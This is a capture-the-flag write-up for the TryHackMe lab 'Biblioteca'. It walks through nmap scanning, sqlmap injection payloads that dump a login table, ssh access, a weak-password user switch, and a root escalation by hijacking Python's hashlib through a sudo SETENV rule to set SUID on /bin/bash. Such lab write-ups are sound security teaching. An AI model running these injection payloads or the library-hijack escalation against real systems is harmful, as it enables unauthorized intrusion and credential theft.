# **Biblioteca - TryHackMe**

*Target Ip. Address: 10.48.134.114*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.134.114
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 04:29 +0000
Nmap scan report for 10.48.134.114
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:9a:62:f5:e5:48:ca:44:f7:25:a8:89:e7:92:66:d3 (RSA)
|   256 64:85:12:ef:8e:87:71:06:2d:6a:34:6e:4d:44:1d:27 (ECDSA)
|_  256 f3:c2:1e:54:96:a8:85:37:a1:37:a8:92:29:34:2c:e8 (ED25519)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
|_http-title:  Login 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.85 seconds
```

So, we have 2 open ports. Port 22 (ssh) and Port 8000 (http).

<img width="1184" height="941" alt="image" src="https://github.com/user-attachments/assets/eb4e1aca-f6f6-4743-823e-0ba3b41f5573" />

We have a login page, I tried manual sqli and it worked, so let's dump the credentials to move forward.

```bash
kali@kali:sqlmap -r 1.txt --batch --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:34:12 /2026-03-09/

[04:34:12] [INFO] parsing HTTP request from '1.txt'
[04:34:13] [INFO] testing connection to the target URL
.
.
.
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=123' AND (SELECT 8614 FROM (SELECT(SLEEP(5)))UvcM) AND 'QdUY'='QdUY&password=1313

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=123' UNION ALL SELECT NULL,CONCAT(0x7178717071,0x4955447749764c516c5a7966554c4d7a554b6a424f6f596d4a76436c48684d496a74764866545850,0x71766b6271),NULL,NULL-- -&password=1313
---
[04:34:28] [INFO] the back-end DBMS is MySQL
.
.
.
Database: website
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My...23        | smokey   |
+----+-------------------+----------------+----------+

[04:34:29] [INFO] table 'website.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.48.134.114/dump/website/users.csv'
[04:34:29] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 24 times
[04:34:29] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.48.134.114'

[*] ending @ 04:34:29 /2026-03-09/
```

We have the credentials, let' test it for ssh login.

```bash
kali@kali:ssh smokey@10.48.134.114
The authenticity of host '10.48.134.114 (10.48.134.114)' can't be established.
ED25519 key fingerprint is: SHA256:ctR1ZU3pl9aNQCzwuNN3937WyMdr3CgVgY2cpV7jOHk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.134.114' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
smokey@10.48.134.114's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 09 Mar 2026 04:36:06 AM UTC

  System load:  0.03              Processes:             114
  Usage of /:   66.7% of 9.75GB   Users logged in:       0
  Memory usage: 18%               IPv4 address for eth0: 10.48.134.114
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Tue Dec  7 03:21:42 2021 from 10.0.2.15
smokey@ip-10-48-134-114:~$ id
uid=1000(smokey) gid=1000(smokey) groups=1000(smokey)
```

That was successful. We are logged in as user smokey.

There is no user flag here. We are given hint that theere is weak password, we have another user hazel.

The password was hazel:hazel. That is the weak password for sure.

```bash
smokey@ip-10-48-134-114:/home$ su hazel
Password:                                                                                                                                       
hazel@ip-10-48-134-114:/home$ id                                                                                                                
uid=1001(hazel) gid=1001(hazel) groups=1001(hazel)
```

We find our first user flag.

```bash
hazel@ip-10-48-134-114:~$ cat user.txt 
THM{G0.....d$}
```

There is a python script that can be run by root via sudo.

```bash
hazel@ip-10-48-134-114:~$ sudo -l
Matching Defaults entries for hazel on ip-10-48-134-114:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on ip-10-48-134-114:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

We have root permissions for SETENV, this is moving towards python library hijacking.

```bash
hazel@ip-10-48-134-114:~$ cat hasher.py 
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()
```

Let's copy the hashlib library to /tmp directory.

```bash
hazel@ip-10-48-134-114:~$ cp /usr/lib/python3.8/hashlib.py /tmp/
```

We will set SUID /bin/bash, to escalate to root.

```bash
hazel@ip-10-48-134-114:~$ cat /tmp/hashlib.py 
import os
os.system("sudo chmod +s /bin/bash")
```

Now, let's run the exploit, ignore the errors.

```bash
hazel@ip-10-48-134-114:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
Enter a password to hash: abcde
Traceback (most recent call last):
  File "/home/hazel/hasher.py", line 26, in <module>
    main()
  File "/home/hazel/hasher.py", line 23, in main
    hashing(passw)
  File "/home/hazel/hasher.py", line 5, in hashing
    md5 = hashlib.md5(passw.encode())
.
.
.
```

Our exploit code has already been exected. Let's verify if that worked.

```bash
hazel@ip-10-48-134-114:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

That was successful. Now, we can become root.

```bash
hazel@ip-10-48-134-114:~$ /bin/bash -p
bash-5.0# id
uid=1001(hazel) gid=1001(hazel) euid=0(root) egid=0(root) groups=0(root),1001(hazel)
```

Let's read the final root flag and end this challenge.

```bash
bash-5.0# cat root.txt
THM{Py.....n6}
```
